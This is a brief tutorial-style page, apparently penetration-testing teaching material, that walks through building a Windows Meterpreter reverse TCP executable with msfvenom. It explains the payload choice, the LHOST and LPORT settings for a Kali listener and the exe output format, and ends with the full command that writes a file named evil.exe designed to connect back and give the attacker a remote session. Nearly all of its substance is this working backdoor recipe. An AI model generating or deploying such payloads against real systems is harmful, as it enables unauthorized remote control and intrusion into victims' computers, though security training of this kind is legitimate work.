Generating a Windows Reverse TCP Payload

Step-by-step creation of an executable for remote access.

Payload: `windows/meterpreter/reverse_tcp` for a Meterpreter session on Windows.

Listener Configuration: Set `LHOST` to your Kali IP and `LPORT` to a chosen port (e.g., 4444).

Output: `-f exe` for a Windows executable, saved to `/root/Desktop/evil.exe`.

Key Takeaway

The generated executable is a self-contained malicious file designed to connect back to your listener.

kali@attacker:~
# Generate a Windows Reverse TCP Payload
user@kali:~$ msfvenom -p windows/meterpreter/reverse_tcp \
         LHOST=<YOUR_KALI_IP> \
         LPORT=4444 \
         -f exe \
         -o /root/Desktop/evil.exe
